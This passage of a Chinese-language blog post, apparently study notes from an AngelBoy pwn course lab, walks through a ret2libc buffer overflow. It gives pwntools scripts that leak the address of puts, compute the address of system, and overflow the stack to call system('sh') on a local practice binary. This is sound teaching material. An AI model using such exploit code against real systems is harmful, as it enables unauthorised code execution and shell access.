+<h4 id="接收puts的addr"><a href="#接收puts的addr" class="headerlink" title="接收puts的addr"></a>接收puts的addr</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                                                                                               r = process(<span class="string">&#x27;./ret2lib&#x27;</span>)</span><br><span class="line"></span><br><span class="line">put_got = <span class="number">0x804a01c</span></span><br><span class="line">    </span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(put_got))</span><br><span class="line"><span class="comment">#送出put的offset</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">put_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#接收put的addr</span></span><br></pre></td></tr></table></figure></div>
+<p>這邊用strip取字串，然後轉成16進位，要小心:後面還有一個空格，要記得recv</p>
+<h4 id="算出payload需要的各種位置"><a href="#算出payload需要的各種位置" class="headerlink" title="算出payload需要的各種位置"></a>算出payload需要的各種位置</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                                                                                               r = process(<span class="string">&#x27;./ret2lib&#x27;</span>)</span><br><span class="line"></span><br><span class="line">put_got = <span class="number">0x804a01c</span></span><br><span class="line">    </span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(put_got))</span><br><span class="line"><span class="comment">#送出put的offset</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">put_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#接收put的addr</span></span><br><span class="line"></span><br><span class="line">put_offset = <span class="number">0x71290</span></span><br><span class="line">system_offset = <span class="number">0x45420</span></span><br><span class="line">libc_base_addr = put_addr - put_offset</span><br><span class="line">system_addr = libc_base_addr + system_offset</span><br><span class="line">sh = <span class="number">0x0804829e</span></span><br><span class="line"><span class="comment">#算出payload需要的各種位置</span></span><br></pre></td></tr></table></figure></div>
+<p>puts、system的offset可以用<code>$ objdump -T  /lib32/libc.so.6 | grep puts</code>、<code>$ objdump -T  /lib32/libc.so.6 | grep system</code>找到<br>然後上面有提到那個公式，總之就是推出system的address<br>最後找到程式裡面”sh”字串的位置，可以用ROPgadget找(我是用這個);或是ida的string view好像也可以找到<br>ROPgadget的找法就是<code>ROPgadget --binary ret2lib --string &#39;sh&#39;</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/JiEMXPu.png"
+                     
+                ><br>到這邊需要的資訊就都到齊了，最後payload再把他組起來就好了</p>
+<h4 id="送payload"><a href="#送payload" class="headerlink" title="送payload"></a>送payload</h4><p>最後一步</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                                                                                               r = process(<span class="string">&#x27;./ret2lib&#x27;</span>)</span><br><span class="line"></span><br><span class="line">put_got = <span class="number">0x804a01c</span></span><br><span class="line">    </span><br><span class="line">r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(put_got))</span><br><span class="line"><span class="comment">#送出put的offset</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">put_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#接收put的addr</span></span><br><span class="line"></span><br><span class="line">put_offset = <span class="number">0x71290</span></span><br><span class="line">system_offset = <span class="number">0x45420</span></span><br><span class="line">libc_base_addr = put_addr - put_offset</span><br><span class="line">system_addr = libc_base_addr + system_offset</span><br><span class="line">sh = <span class="number">0x0804829e</span></span><br><span class="line"><span class="comment">#算出payload需要的各種位置</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">60</span></span><br><span class="line">payload += p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="comment">#送payload </span></span><br></pre></td></tr></table></figure></div>
+<p>還記得剛剛有找過要塞60bytes才會buffer overflow，所以傳b’a’*60<br>然後要跳到system的位置，並且要隨便塞一個address，上面有提到要空一個return address，他會從return address下面4個bytes開始吃參數，所以就亂塞一個地址(0xdeadbeef好像是大家的習慣XD)，然後把sh傳進去，這樣就會執行system(‘&#x2F;sh’)，成功拿到shell~<br>這題就解掉了~</p>
+<!-- CSS -->
+<style>
+    .navbar-brand:before {
+        content: 'Magic_Chihua × ' !important;
+        padding-left: 2em;
+        background-image: url(https://i.imgur.com/BWXp8py.png);
+        background-repeat: no-repeat;
+        background-size: contain;
+    }
+    .navbar-brand > .fa-file-text {
+        display: none;
+    }
+    .red{
+        color:#F00;
+        font-weight: bold;
+    }
+</style>
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> AngelBoy Pwn1</li>
+        <li><strong>Author:</strong> Tr0y2ooo</li>
+        <li><strong>Created at
+                :</strong> 2024-11-20 09:31:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-11-20 09:35:36
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://tr0y2ooo.github.io/2024/11/20/ngelBoy-Pwn1/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/11/12/XSS%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">練習XSS</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">AngelBoy Pwn1</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#AngelBoy-Pwn-Video1"><span class="nav-text">AngelBoy_Pwn Video1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GDB"><span class="nav-text">GDB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Basic-command"><span class="nav-text">Basic command</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PEDA"><span class="nav-text">PEDA</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Execution"><span class="nav-text">Execution</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Binary-Format"><span class="nav-text">Binary Format</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Section"><span class="nav-text">Section</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Execution-Flow"><span class="nav-text">Execution Flow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x86-assembly"><span class="nav-text">x86 assembly</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Registers"><span class="nav-text">Registers</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Basic-instruction"><span class="nav-text">Basic instruction</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#calling-convention"><span class="nav-text">calling convention</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hello-World"><span class="nav-text">Hello World</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Shellcode"><span class="nav-text">Shellcode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stack-base-buffer-overflow"><span class="nav-text">Stack base buffer overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Buffer-Overflow"><span class="nav-text">Buffer Overflow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Return-to-Text-Shellcode"><span class="nav-text">Return to Text&#x2F;Shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Protection"><span class="nav-text">Protection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lazy-binding"><span class="nav-text">Lazy binding</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Return-to-Library"><span class="nav-text">Return to Library</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lab"><span class="nav-text">Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Lab1"><span class="nav-text">Lab1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lab2"><span class="nav-text">Lab2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lab3"><span class="nav-text">Lab3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lab4"><span class="nav-text">Lab4</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Tr0y2ooo</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        7 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
